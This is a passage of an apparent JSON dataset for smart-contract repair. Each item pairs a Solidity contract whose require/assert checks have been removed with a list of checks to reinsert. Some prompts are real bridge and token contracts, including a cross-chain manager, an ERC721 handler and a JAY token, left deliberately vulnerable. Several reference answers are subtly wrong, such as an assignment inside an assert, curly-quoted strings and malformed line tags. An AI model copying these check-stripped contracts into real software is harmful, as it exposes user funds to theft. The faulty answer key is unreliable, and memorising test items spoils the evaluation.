and trigger executation of cross chain tx on Ethereum side\n128     *  @param _toContract       The targeting contract that will be invoked by the Ethereum Cross Chain Manager contract\n129     *  @param _method           At which method will be invoked within the targeting contract\n130     *  @param _args             The parameter that will be passed into the targeting contract\n131     *  @param _fromContractAddr From chain smart contract address\n132     *  @param _fromChainId      Indicate from which chain current cross chain tx comes \n133     *  @return                  true or false\n134     */\n135     function _executeCrossChainTx(address _toContract, bytes memory _method, bytes memory _args, bytes memory _fromContractAddr, uint64 _fromChainId) internal returns (bool){\n136         // Ensure the targeting contract gonna be invoked is indeed a contract rather than a normal account address\n137         require(Utils.isContract(_toContract), \"The passed in address is not a contract!\");\n138         bytes memory returnData;\n139         bool success;\n140         // The returnData will be bytes32, the last byte must be 01;\n141         (success, returnData) = _toContract.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, \"(bytes,bytes,uint64)\"))), abi.encode(_args, _fromContractAddr, _fromChainId)));\n        \n142         // Ensure the executation is successful       \n        \n143         // Ensure the returned value is true\n144         require(returnData.length != 0, \"No return value from business contract!\");\n145         (bool res,) = ZeroCopySource.NextBool(returnData, 31);\n             \n146         return true;\n147     }\n148 }",
        "completion": "29+  require(header.nextBookkeeper == nextBookKeeper, \"NextBookers illegal\");\n30+  require(eccd.putCurEpochStartHeight(header.height), \"Save Poly chain current epoch start height to Data contract failed!\");\n30+ require(eccd.putCurEpochConPubKeyBytes(ECCUtils.serializeKeepers(keepers)), \"Save Poly chain current epoch book keepers to Data contract failed!\");\n48+  require(header.nextBookkeeper != bytes20(0), \"The nextBookKeeper of header is empty\");\n51+  require(ECCUtils.verifySig(rawHeader, sigList, polyChainBKs, n - (n - 1) / 3), \"Verify signature failed!\");\n54+ require(header.nextBookkeeper == nextBookKeeper, \"NextBookers illegal\");\n55+ require(eccd.putCurEpochStartHeight(header.height), \"Save MC LatestHeight to Data contract failed!\");\n55+ require(eccd.putCurEpochConPubKeyBytes(ECCUtils.serializeKeepers(keepers)), \"Save Poly chain book keepers bytes to Data contract failed!\");\n83+ require(eccd.putEthTxHash(keccak256(rawParam)), \"Save ethTxHash by index to Data contract failed!\");\n106+  require(ECCUtils.verifySig(rawHeader, headerSig, polyChainBKs, n - ( n - 1) / 3), \"Verify poly chain header signature failed!\");\n108+  require(ECCUtils.verifySig(curRawHeader, headerSig, polyChainBKs, n - ( n - 1) / 3), \"Verify poly chain current epoch header signature failed!\");\n112+  require(ECCUtils.getHeaderHash(rawHeader) == Utils.bytesToBytes32(proveValue), \"verify header proof failed!\");\n117+  require(!eccd.checkIfFromChainTxExist(toMerkleValue.fromChainID, Utils.bytesToBytes32(toMerkleValue.txHash)), \"the transaction has been executed!\");\n117+ require(eccd.markFromChainTxExist(toMerkleValue.fromChainID, Utils.bytesToBytes32(toMerkleValue.txHash)), \"Save crosschain tx exist failed!\");\n118+  require(toMerkleValue.makeTxParam.toChainId == uint64(2), \"This Tx is not aiming at Ethereum network!\");\n121+  require(_executeCrossChainTx(toContract, toMerkleValue.makeTxParam.method, toMerkleValue.makeTxParam.args, toMerkleValue.makeTxParam.fromContract, toMerkleValue.fromChainID), \"Execute CrossChain Tx failed!\");\n139+ assert(_method != \u201cf1121318093\u201d); \n143+ require(success == true, \"EthCrossChain call business contract failed\");\n145+  require(res == true, \"EthCrossChain call business contract return is not true\");"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: LGPL-3.0-only\n2 pragma solidity 0.6.12;\n3 pragma experimental ABIEncoderV2;\n\n4 import \"../interfaces/IDepositExecute.sol\";\n5 import \"./HandlerHelpers.sol\";\n6 import \"../ERC721Safe.sol\";\n7 import \"@openzeppelin/contracts/introspection/ERC165Checker.sol\";\n8 import \"@openzeppelin/contracts/token/ERC721/IERC721Metadata.sol\";\n\n\n9 /**\n10     @title Handles ERC721 deposits and deposit executions.\n11     @author ChainSafe Systems.\n12     @notice This contract is intended to be used with the Bridge contract.\n13  */\n14 contract ERC721Handler is IDepositExecute, HandlerHelpers, ERC721Safe {\n15     using ERC165Checker for address;\n\n16     bytes4 private constant _INTERFACE_ERC721_METADATA = 0x5b5e139f;\n\n17     /**\n18         @param bridgeAddress Contract address of previously deployed Bridge.\n19      */\n20     constructor(\n21         address bridgeAddress\n22     ) public HandlerHelpers(bridgeAddress) {\n23     }\n\n24     /**\n25         @notice A deposit is initiatied by making a deposit in the Bridge contract.\n26         @param resourceID ResourceID used to find address of token to be used for deposit.\n27         @param depositer Address of account making the deposit in the Bridge contract.\n28         @param data Consists of {tokenID} padded to 32 bytes.\n29         @notice Data passed into the function should be constructed as follows:\n30         tokenID                                     uint256    bytes    0  - 32\n31         @notice If the corresponding {tokenAddress} for the parsed {resourceID} supports {_INTERFACE_ERC721_METADATA},\n32         then {metaData} will be set according to the {tokenURI} method in the token contract.\n33         @dev Depending if the corresponding {tokenAddress} for the parsed {resourceID} is\n34         marked true in {_burnList}, deposited tokens will be burned, if not, they will be locked.\n35         @return metaData : the deposited token metadata acquired by calling a {tokenURI} method in the token contract.\n36      */\n37     function deposit(bytes32    resourceID,\n38                     address     depositer,\n39                     bytes       calldata data\n40                     ) external override onlyBridge returns (bytes memory metaData) {\n41         uint         tokenID;\n\n42         (tokenID) = abi.decode(data, (uint));\n\n43         address tokenAddress = _resourceIDToTokenContractAddress[resourceID];\n     \n44         // Check if the contract supports metadata, fetch it if it does\n45         if (tokenAddress.supportsInterface(_INTERFACE_ERC721_METADATA)) {\n46             IERC721Metadata erc721 = IERC721Metadata(tokenAddress);\n47             metaData = bytes(erc721.tokenURI(tokenID));\n48         }\n\n49         if (_burnList[tokenAddress]) {\n50             burnERC721(tokenAddress, tokenID);\n51         } else {\n52             lockERC721(tokenAddress, depositer, address(this), tokenID);\n53         }\n54     }\n\n55     /**\n56         @notice Proposal execution should be initiated when a proposal is finalized in the Bridge contract.\n57         by a relayer on the deposit's destination chain.\n58         @param data Consists of {tokenID}, {resourceID}, {lenDestinationRecipientAddress},\n59         {destinationRecipientAddress}, {lenMeta}, and {metaData} all padded to 32 bytes.\n60         @notice Data passed into the function should be constructed as follows:\n61         tokenID                                     uint256    bytes    0  - 32\n62         destinationRecipientAddress     length      uint256    bytes    32 - 64\n63         destinationRecipientAddress                   bytes    bytes    64 - (64 + len(destinationRecipientAddress))\n64         metadata                        length      uint256    bytes    (64 + len(destinationRecipientAddress)) - (64 + len(destinationRecipientAddress) + 32)\n65         metadata                                      bytes    bytes    (64 + len(destinationRecipientAddress) + 32) - END\n66      */\n67     function executeProposal(bytes32 resourceID, bytes calldata data) external override onlyBridge {\n68         uint         tokenID;\n69         uint         lenDestinationRecipientAddress;\n70         bytes memory destinationRecipientAddress;\n71         uint         offsetMetaData;\n72         uint         lenMetaData;\n73         bytes memory metaData;\n\n74         (tokenID, lenDestinationRecipientAddress) = abi.decode(data, (uint, uint));\n75         offsetMetaData = 64 + lenDestinationRecipientAddress;\n76         destinationRecipientAddress = bytes(data[64:offsetMetaData]);\n77         lenMetaData = abi.decode(data[offsetMetaData:], (uint));\n78         metaData = bytes(data[offsetMetaData + 32:offsetMetaData + 32 + lenMetaData]);\n\n79         bytes20 recipientAddress;\n\n80         assembly {\n81             recipientAddress := mload(add(destinationRecipientAddress, 0x20))\n82         }\n\n83         address tokenAddress = _resourceIDToTokenContractAddress[resourceID];      \n84         if (_burnList[tokenAddress]) {\n85             mintERC721(tokenAddress, address(recipientAddress), tokenID, metaData);\n86         } else {\n87             releaseERC721(tokenAddress, address(this), address(recipientAddress), tokenID);\n88         }\n89     }\n\n90     /**\n91         @notice Used to manually release ERC721 tokens from ERC721Safe.\n92         @param tokenAddress Address of token contract to release.\n93         @param recipient Address to release token to.\n94         @param tokenID The ERC721 token ID to release.\n95      */\n96     function withdraw(address tokenAddress, address recipient, uint tokenID) external override onlyBridge {\n97         releaseERC721(tokenAddress, address(this), recipient, tokenID);\n98     }\n99 }",
        "completion": "43+    require(_contractWhitelist[tokenAddress], \"provided tokenAddress is not whitelisted\");\n83+   require(_contractWhitelist[address(tokenAddress)], \"provided tokenAddress is not whitelisted\");\n"
    },
    {
        "prompt": "1 // SPDX-License-Identifier: LGPL-3.0-only\n2 pragma solidity 0.6.12;\n3 pragma experimental ABIEncoderV2;\n\n4 import \"../interfaces/IDepositExecute.sol\";\n5 import \"./HandlerHelpers.sol\";\n6 import \"../ERC721Safe.sol\";\n7 import \"@openzeppelin/contracts/introspection/ERC165Checker.sol\";\n8 import \"@openzeppelin/contracts/token/ERC721/IERC721Metadata.sol\";\n\n\n9 /**\n10     @title Handles ERC721 deposits and deposit executions.\n11     @author ChainSafe Systems.\n12     @notice This contract is intended to be used with the Bridge contract.\n13  */\n14 contract ERC721Handler is IDepositExecute, HandlerHelpers, ERC721Safe {\n15     using ERC165Checker for address;\n\n16     bytes4 private constant _INTERFACE_ERC721_METADATA = 0x5b5e139f;\n\n17     /**\n18         @param bridgeAddress Contract address of previously deployed Bridge.\n19      */\n20     constructor(\n21         address bridgeAddress\n22     ) public HandlerHelpers(bridgeAddress) {\n23     }\n\n24     /**\n25         @notice A deposit is initiatied by making a deposit in the Bridge contract.\n26         @param resourceID ResourceID used to find address of token to be used for deposit.\n27         @param depositer Address of account making the deposit in the Bridge contract.\n28         @param data Consists of {tokenID} padded to 32 bytes.\n29         @notice Data passed into the function should be constructed as follows:\n30         tokenID                                     uint256    bytes    0  - 32\n31         @notice If the corresponding {tokenAddress} for the parsed {resourceID} supports {_INTERFACE_ERC721_METADATA},\n32         then {metaData} will be set according to the {tokenURI} method in the token contract.\n33         @dev Depending if the corresponding {tokenAddress} for the parsed {resourceID} is\n34         marked true in {_burnList}, deposited tokens will be burned, if not, they will be locked.\n35         @return metaData : the deposited token metadata acquired by calling a {tokenURI} method in the token contract.\n36      */\n37     function deposit(bytes32    resourceID,\n38                     address     depositer,\n39                     bytes       calldata data\n40                     ) external override onlyBridge returns (bytes memory metaData) {\n41         uint         tokenID;\n\n42         (tokenID) = abi.decode(data, (uint));\n\n43         address tokenAddress = _resourceIDToTokenContractAddress[resourceID];      \n44         // Check if the contract supports metadata, fetch it if it does\n45         if (tokenAddress.supportsInterface(_INTERFACE_ERC721_METADATA)) {\n46             IERC721Metadata erc721 = IERC721Metadata(tokenAddress);\n47             metaData = bytes(erc721.tokenURI(tokenID));\n48         }\n\n49         if (_burnList[tokenAddress]) {\n50             burnERC721(tokenAddress, tokenID);\n51         } else {\n52             lockERC721(tokenAddress, depositer, address(this), tokenID);\n53         }\n54     }\n\n55     /**\n56         @notice Proposal execution should be initiated when a proposal is finalized in the Bridge contract.\n57         by a relayer on the deposit's destination chain.\n58         @param data Consists of {tokenID}, {resourceID}, {lenDestinationRecipientAddress},\n59         {destinationRecipientAddress}, {lenMeta}, and {metaData} all padded to 32 bytes.\n60         @notice Data passed into the function should be constructed as follows:\n61         tokenID                                     uint256    bytes    0  - 32\n62         destinationRecipientAddress     length      uint256    bytes    32 - 64\n63         destinationRecipientAddress                   bytes    bytes    64 - (64 + len(destinationRecipientAddress))\n64         metadata                        length      uint256    bytes    (64 + len(destinationRecipientAddress)) - (64 + len(destinationRecipientAddress) + 32)\n65         metadata                                      bytes    bytes    (64 + len(destinationRecipientAddress) + 32) - END\n66      */\n67     function executeProposal(bytes32 resourceID, bytes calldata data) external override onlyBridge {\n68         uint         tokenID;\n69         uint         lenDestinationRecipientAddress;\n70         bytes memory destinationRecipientAddress;\n71         uint         offsetMetaData;\n72         uint         lenMetaData;\n73         bytes memory metaData;\n\n74         (tokenID, lenDestinationRecipientAddress) = abi.decode(data, (uint, uint));\n75         offsetMetaData = 64 + lenDestinationRecipientAddress;\n76         destinationRecipientAddress = bytes(data[64:offsetMetaData]);\n77         lenMetaData = abi.decode(data[offsetMetaData:], (uint));\n78         metaData = bytes(data[offsetMetaData + 32:offsetMetaData + 32 + lenMetaData]);\n\n79         bytes20 recipientAddress;\n\n80         assembly {\n81             recipientAddress := mload(add(destinationRecipientAddress, 0x20))\n82         }\n\n83         address tokenAddress = _resourceIDToTokenContractAddress[resourceID];      \n\n84         if (_burnList[tokenAddress]) {\n85             mintERC721(tokenAddress, address(recipientAddress), tokenID, metaData);\n86         } else {\n87             releaseERC721(tokenAddress, address(this), address(recipientAddress), tokenID);\n88         }\n89     }\n\n90     /**\n91         @notice Used to manually release ERC721 tokens from ERC721Safe.\n92         @param tokenAddress Address of token contract to release.\n93         @param recipient Address to release token to.\n94         @param tokenID The ERC721 token ID to release.\n95      */\n96     function withdraw(address tokenAddress, address recipient, uint tokenID) external override onlyBridge {\n97         releaseERC721(tokenAddress, address(this), recipient, tokenID);\n98     }\n99 }",
        "completion": "43+  require(_contractWhitelist[tokenAddress], \"provided tokenAddress is not whitelisted\");\n83+  require(_contractWhitelist[address(tokenAddress)], \"provided tokenAddress is not whitelisted\");\n"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract A {\n3     uint x;\n4     constructor (uint a) public {x= a;}\n5 }\n\n6 contract B is A {\n7     constructor (uint a) A(a) public {x++;}\n8 }\n\n9 contract C is A, B {\n10 }",
        "completion": "7+ assert (x == a + 1);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // Possible bug:\n3 // In this test, ctor D is NOT called twice -\n4 // Only ctor C is called\n5 // compare with ConstructorChaining2_fail.sol\n\n6 contract D {\n7         uint a;\n8     constructor (uint x) public { a = x; }\n9 }\n\n10 contract B is D {\n11     constructor (uint x) D(x+1) public {}\n12 }\n\n13 contract C is B {\n14     constructor (uint x) public { \n15        _;\n16  }   \n17 }",
        "completion": "14+ assert (a == x + 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // This test shows an order in which base constructors for C are called:\n3 // B(a) calls base ctor A(a) {x = a};\n4 // ctor B is called {x++};\n5 // ctor C is called {x++}\n\n\n6 contract A {\n7     uint x;\n8     constructor (uint a) public {x = a;}\n9 }\n\n10 contract B is A {\n11     constructor (uint a) A(a) public {x++;}\n12 }    contract C is A, B {\n13     constructor (uint a) B(a) public {x++;}\n14 }",
        "completion": "13+ assert (x == a + 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Foo {\n\n3     uint a;\n\n4     constructor () public {\n5         a = 1;\n6     }\n\n7     function testConstructor() public {\n8        _;\n9     }\n\n10 }",
        "completion": "7+  assert (a == 1);"
    },
    {
        "prompt": "1 contract ArrayNestedFixedSize {\n\n2     // NOTE: the number of columns comes first in the declaration!\n3     uint[3][2] a;\n4     bool[2][2] aa;\n\n5     constructor() {\n6       _;\n\n7     }\n\n8     function test() public {\n9         uint[3] b;\n10         a[0][0] = 0;\n11         a[0][1] = 1;\n12         uint x = a[0][0]; //print\n13         a[0][2] = 2;\n14         a[1][0] = 3; //may alias with a[0][0]\n15         x = a[0][0]; //print\n16         a[1][1] = 4;\n17         a[1][2] = 5;\n18         b[0] = 5;    //may alias with a[1][0] or a[0][0]\n19         x = a[0][0];  //print\n\n20     }\n21 }",
        "completion": "20+ assert (a[0][0] == 0 || a[0][0] == 3);\n20+  assert (a[0][1] == 1);\n20+  assert (a[0][2] == 2);\n20+  assert (a[1][0] == 3);\n20+  assert (a[1][1] == 4);\n20+  assert (a[1][2] == 5);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract ArrayFixedSize {\n\n3     uint[2] a;\n\n4     constructor() public {}\n\n5     function test() public {\n6         a[0] = 1;\n7         a[1] = 2;\n8     }\n9 }",
        "completion": "7+  assert(a[0] == 1);    \n7+  assert(a[1] == 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract ArrayDynamicStorage {\n\n3     uint[] sa;\n\n4     function ArrayDynamicStorage() {\n5        assert (sa.length == 0);\n6     }\n7     function test() public {\n8         sa.push(10);\n9         sa.push(11);\n10     }\n11 }",
        "completion": "9+ assert (sa[0] == 10);\n9+  assert (sa[1] == 11);\n9+ assert (sa.length == 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract LoopFor {\n\n3     uint[2] a;\n\n4     function testBoundedForLoop() public {\n5         for (uint i = 0; i < 2; i += 1) {\n6             a[i] = i;\n7         }\n\n8     }\n\n9     uint[10] b;\n    \n10     function testUnboundedForLoop(uint n) public {\n11         require (n > 0 && n < 10);\n12         for (uint i = 0; i < n; i += 1) {\n13             b[i] = i;\n14         }\n15         for (uint j = 0; j < n; j += 1) {\n16             _;\n17         }\n18     }\n19 }",
        "completion": "7+  assert (a[0] == 0);\n7+ assert (a[1] == 1);\n15+ assert (b[j] == j);\n"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract A {\n3    function testTuple() public pure{\n4       // (uint a, uint b) = (1, 3); //cannot handle multiple declarations in tuples\n5       uint a;\n6       uint b;\n7       /* only support function returns as tuples\n8       (a,  b) = (1, 3);\n9       */\n\n10       (a, b) = returnTuple();\n11       (a, b) = returnTupleByName();\n\n12       //(, b) = returnTuple(); //can;t handle null placeholders\n13       //assert (b == 40);\n14    }\n   \n15    function returnTuple() private pure returns (uint, uint){\n16       return (4, 40); \n17    }\n\n18    function returnTupleByName() private pure returns (uint a, uint b){\n19       a = 5;\n20       b = 55;\n21       return (a,b); \n22    }\n23 }",
        "completion": "8+ assert (a == 1);\n8+ assert (b == 3);\n10+  assert (a == 4);\n10+. assert (b == 40);\n11+  assert (a == 5);\n11+  assert (b == 55);\n"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract A {\n3     uint x;\n4     constructor (uint a) public {x= a;}\n5 }\n\n6 contract B is A {\n7     constructor (uint a) A(a) public {\n8 x++;\n9 }\n10 }\n\n11 contract C is A, B {\n12 }\n \n13 }",
        "completion": "8+  assert (x == a + 1);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // This test shows an order in which base constructors for C are called:\n3 // B(a) calls base ctor A(a) {x = a};\n4 // ctor B is called {x++};\n5 // ctor C is called {x++}\n\n\n6 contract A {\n7     uint x;\n8     constructor (uint a) public {x = a;}\n9 }\n\n10 contract B is A {\n11     constructor (uint a) A(a) public {x++;}\n12 }    contract C is A, B {\n13     constructor (uint a) B(a) public {x++; \n14 }\n15 }",
        "completion": "13+ assert (x == a + 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Foo {\n\n3     uint a;\n\n4     constructor () public {\n5         a = 1;\n6     }\n\n7     function testConstructor() public {\n8           _;\n         \n9     }\n\n10 }",
        "completion": "7+   assert (a == 1);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 // This test shows an order in which base constructors for C are called:\n3 // B(a) calls base ctor A(a) {x = a};\n4 // ctor B is called {x++};\n5 // ctor C is called {x++}\n\n\n6 contract A {\n7     uint x;\n8     constructor (uint a) public {x = a;}\n9 }\n\n10 contract B is A {\n11     constructor (uint a) A(a) public {x++;}\n12 }    contract C is A, B {\n13     constructor (uint a) B(a) public {\n14         x++;\n15 }\n16 }",
        "completion": "13+ assert (x == a + 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n2 pragma solidity >=0.4.24 <0.6.0;\n\n3 contract Consts {\n\n4     constructor () public {\n5         uint a;\n6         address b;\n7         address c;\n\n8         a = 10;\n9         b = address(0x10);\n10       c = address(0x12);\n\n11     }\n12 }",
        "completion": "10+ assert(b != c);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Branch {\n\n3     function testIf(bool b) public returns (uint a) {\n4         if (b) {\n5             a = 1;\n6         } else {\n7             a = 2;\n8         }\n9     }\n\n10     function testTernary(bool b) public returns (uint a) {\n11         a = b ? 1 : 2;       \n12     }\n\n13 }",
        "completion": "8+  assert (a == 1 || a == 2);\n11+ assert (a == 1 || a == 2);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract DoWhileLoop {\n\n3     function testDoWhileLoop() public {\n4         uint i = 1;\n5         uint sum = 0;\n6         do {\n7             sum += i;\n8             ++i;\n9         } while (i < 1);\n10     }\n\n11 }",
        "completion": "9+   assert (sum == 1);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24 <0.6.0;\n\n2 contract Arithmetics {\n\n3     function addition(uint _a, uint _b) public pure returns (uint c) {\n4         c = _a + _b;\n      \n5     }\n\n6     function subtraction(uint _a, uint _b) public pure returns (uint c) {\n7         c = _a - _b;       \n8     }\n\n9     function mutliplication(uint _a, uint _b) public pure returns (uint c) {\n10         c = _a * _b;       \n11     }\n\n12     function division(uint _a, uint _b) public pure returns (uint c) {\n13         c = _a / _b;      \n14     }\n\n15 }",
        "completion": "4+ assert (c == _a + _b);\n7+ assert (c == _a - _b);\n10+ assert (c == _a * _b);\n13+  assert (c == _a / _b);"
    },
    {
        "prompt": "1 pragma solidity >=0.4.24<0.6.0; contract Crowdsale {\n2     uint raised;\n3     uint goal;\n4     uint deadline;\n\n5     bool finished; // Instrumented.\n6     bool canceled; // Instrumented.\n\n7     constructor(uint _goal) public {\n8         goal = _goal;\n9         deadline = now + 365 days;\n10     }\n\n11     function invest() public payable {\n12         require(now <= deadline);\n13         raised += msg.value;\n14     }\n\n15     function finish() public {\n16         require(address(this).balance >= goal);\n17     }\n\n18     function cancel() public {\n19         require(address(this).balance < goal && now > deadline);      \n20     }\n\n21     function repOK() public view {\n22         _;\n23     }\n24 }",
        "completion": "16+ assert(finished = true);\n19+ assert(canceled = true); \n22+ assert(!(finished && canceled)); "
    },
    {
        "prompt": "1 contract JAY is ERC20, Ownable {\n2     using SafeMath for uint256;\n3     AggregatorV3Interface internal priceFeed;\n\n4     address private dev;\n5     uint256 public constant MIN = 1000;\n6     bool private start = false;\n7     bool private lockDev = false;\n\n8     uint256 private nftsBought;\n9     uint256 private nftsSold;\n\n10     uint256 private buyNftFeeEth = 0.01 * 10**18;\n11     uint256 private buyNftFeeJay = 10 * 10**18;\n\n12     uint256 private sellNftFeeEth = 0.001 * 10**18;\n\n13     uint256 private constant USD_PRICE_SELL = 2 * 10**18;\n14     uint256 private constant USD_PRICE_BUY = 10 * 10**18;\n\n15     uint256 private nextFeeUpdate = block.timestamp.add(7 days);\n\n16     event Price(uint256 time, uint256 price);\n\n17     constructor() payable ERC20(\"JayPeggers\", \"JAY\") {\n18         require(msg.value == 2 * 10**18);\n19         dev = msg.sender;\n20         _mint(msg.sender, 2 * 10**18 * MIN);\n21         emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n22         priceFeed = AggregatorV3Interface(0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419); //main\n23     }\n\n24     function updateDevWallet(address _address) public onlyOwner {    \n25         dev = _address;\n26     }\n27     function lockDevWallet() public onlyOwner {\n28         lockDev = true;\n29     }\n\n30     function startJay() public onlyOwner {\n31         start = true;\n32     }\n\n33     // Buy NFTs from Vault\n34     function buyNFTs(\n35         address[] calldata erc721TokenAddress,\n36         uint256[] calldata erc721Ids,\n37         address[] calldata erc1155TokenAddress,\n38         uint256[] calldata erc1155Ids,\n39         uint256[] calldata erc1155Amounts\n40     ) public payable {\n41         uint256 total = erc721TokenAddress.length;\n42         if (total != 0) buyERC721(erc721TokenAddress, erc721Ids);\n\n43         if (erc1155TokenAddress.length != 0)\n44             total = total.add(\n45                 buyERC1155(erc1155TokenAddress, erc1155Ids, erc1155Amounts)\n46             );\n\n\n47         (bool success, ) = dev.call{value: msg.value.div(2)}(\"\");    \n48         _burn(msg.sender, total.mul(buyNftFeeJay));\n49         nftsBought += total;\n\n50         emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n51     }\n\n52     function buyERC721(address[] calldata _tokenAddress, uint256[] calldata ids)\n53         internal\n54     {\n55         for (uint256 id = 0; id < ids.length; id++) {\n56             IERC721(_tokenAddress[id]).safeTransferFrom(\n57                 address(this),\n58                 msg.sender,\n59                 ids[id]\n60             );\n61         }\n62     }\n\n63     function buyERC1155(\n64         address[] calldata _tokenAddress,\n65         uint256[] calldata ids,\n66         uint256[] calldata amounts\n67     ) internal returns (uint256) {\n68         uint256 amount = 0;\n69         for (uint256 id = 0; id < ids.length; id++) {\n70             amount = amount.add(amounts[id]);\n71             IERC1155(_tokenAddress[id]).safeTransferFrom(\n72                 address(this),\n73                 msg.sender,\n74                 ids[id],\n75                 amounts[id],\n76                 \"\"\n77             );\n78         }\n79         return amount;\n80     }\n\n81     // Sell NFTs (Buy Jay)\n82     function buyJay(\n83         address[] calldata erc721TokenAddress,\n84         uint256[] calldata erc721Ids,\n85         address[] calldata erc1155TokenAddress,\n86         uint256[] calldata erc1155Ids,\n87         uint256[] calldata erc1155Amounts\n88     ) public payable {\n89         require(start, \"Not started!\");\n90         uint256 total = erc721TokenAddress.length;\n91         if (total != 0) buyJayWithERC721(erc721TokenAddress, erc721Ids);\n\n92         if (erc1155TokenAddress.length != 0)\n93             total = total.add(\n94                 buyJayWithERC1155(\n95                     erc1155TokenAddress,\n96                     erc1155Ids,\n97                     erc1155Amounts\n98                 )\n99             );\n\n100         if (total >= 100)\n101           _;\n    \n102         else\n103            _;\n\n104         _mint(msg.sender, ETHtoJAY(msg.value).mul(97).div(100));\n\n105         (bool success, ) = dev.call{value: msg.value.div(34)}(\"\");\n    \n106         nftsSold += total;\n\n107         emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n108     }\n\n109     function buyJayWithERC721(\n110         address[] calldata _tokenAddress,\n111         uint256[] calldata ids\n112     ) internal {\n113         for (uint256 id = 0; id < ids.length; id++) {\n114             IERC721(_tokenAddress[id]).transferFrom(\n115                 msg.sender,\n116                 address(this),\n117                 ids[id]\n118             );\n119         }\n120     }\n\n121     function buyJayWithERC1155(\n122         address[] calldata _tokenAddress,\n123         uint256[] calldata ids,\n124         uint256[] calldata amounts\n125     ) internal returns (uint256) {\n126         uint256 amount = 0;\n127         for (uint256 id = 0; id < ids.length; id++) {\n128             amount = amount.add(amounts[id]);\n129             IERC1155(_tokenAddress[id]).safeTransferFrom(\n130                 msg.sender,\n131                 address(this),\n132                 ids[id],\n133                 amounts[id],\n134                 \"\"\n135             );\n136         }\n137         return amount;\n138     }\n\n139     // Sell Jay\n140     function sell(uint256 value) public {\n      \n141         uint256 eth = JAYtoETH(value);\n142         _burn(msg.sender, value);\n\n143         (bool success, ) = msg.sender.call{value: eth.mul(90).div(100)}(\"\");     \n144         (bool success2, ) = dev.call{value: eth.div(33)}(\"\");\n\n\n145         emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n146     }\n\n147     // Buy Jay (No NFT)\n148     function buyJayNoNFT() public payable {\n   \n\n149         _mint(msg.sender, ETHtoJAY(msg.value).mul(85).div(100));\n\n150         (bool success, ) = dev.call{value: msg.value.div(20)}(\"\");       \n151         emit Price(block.timestamp, JAYtoETH(1 * 10**18));\n152     }\n\n153     //utils\n154     function getBuyJayNoNFT(uint256 amount) public view returns (uint256) {\n155         return\n156             amount.mul(totalSupply()).div(address(this).balance).mul(85).div(\n157                 100\n158             );\n159     }\n\n160     function getBuyJayNFT(uint256 amount) public view returns (uint256) {\n161         return\n162             amount.mul(totalSupply()).div(address(this).balance).mul(97).div(\n163                 100\n164             );\n165     }\n\n166     function JAYtoETH(uint256 value) public view returns (uint256) {\n167         return (value * address(this).balance).div(totalSupply());\n168     }\n\n169     function ETHtoJAY(uint256 value) public view returns (uint256) {\n170         return value.mul(totalSupply()).div(address(this).balance.sub(value));\n171     }\n\n172     // chainlink pricefeed / fee updater\n173     function getFees()\n174         public\n175         view\n176         returns (\n177             uint256,\n178             uint256,\n179             uint256,\n180             uint256\n181         )\n182     {\n183         return (sellNftFeeEth, buyNftFeeEth, buyNftFeeJay, nextFeeUpdate);\n184     }\n\n185     function getTotals()\n186         public\n187         view\n188         returns (\n189             uint256,\n190             uint256\n191         )\n192     {\n193         return (nftsBought, nftsSold);\n194     }\n\n\n195     function updateFees()\n196         public\n197         returns (\n198             uint256,\n199             uint256,\n200             uint256,\n201             uint256\n202         )\n203     {\n204         (\n205             uint80 roundID,\n206             int256 price,\n207             uint256 startedAt,\n208             uint256 timeStamp,\n209             uint80 answeredInRound\n210         ) = priceFeed.latestRoundData();\n211         uint256 _price = uint256(price).mul(1 * 10**10);\n212         require(\n213             timeStamp > nextFeeUpdate,\n214             \"Fee update every 24 hrs\"\n215         );\n\n216         uint256 _sellNftFeeEth;\n217         if (_price > USD_PRICE_SELL) {\n218             uint256 _p = _price.div(USD_PRICE_SELL);\n219             _sellNftFeeEth = uint256(1 * 10**18).div(_p);\n220         } else {\n221             _sellNftFeeEth = USD_PRICE_SELL.div(_price);\n222         }\n\n223         require(\n224             owner() == msg.sender ||\n225                 (sellNftFeeEth.div(2) < _sellNftFeeEth &&\n226                     sellNftFeeEth.mul(150) > _sellNftFeeEth),\n227             \"Fee swing too high\"\n228         );\n\n229         sellNftFeeEth = _sellNftFeeEth;\n\n230         if (_price > USD_PRICE_BUY) {\n231             uint256 _p = _price.div(USD_PRICE_BUY);\n232             buyNftFeeEth = uint256(1 * 10**18).div(_p);\n233         } else {\n234             buyNftFeeEth = USD_PRICE_BUY.div(_price);\n235         }\n236         buyNftFeeJay = ETHtoJAY(buyNftFeeEth);\n\n237         nextFeeUpdate = timeStamp.add(24 hours);\n238         return (sellNftFeeEth, buyNftFeeEth, buyNftFeeJay, nextFeeUpdate);\n239     }\n\n240     function getLatestPrice() public view returns (int256) {\n241         (\n242             uint80 roundID,\n243             int256 price,\n244             uint256 startedAt,\n245             uint256 timeStamp,\n246             uint80 answeredInRound\n247         ) = priceFeed.latestRoundData();\n248         return price;\n249     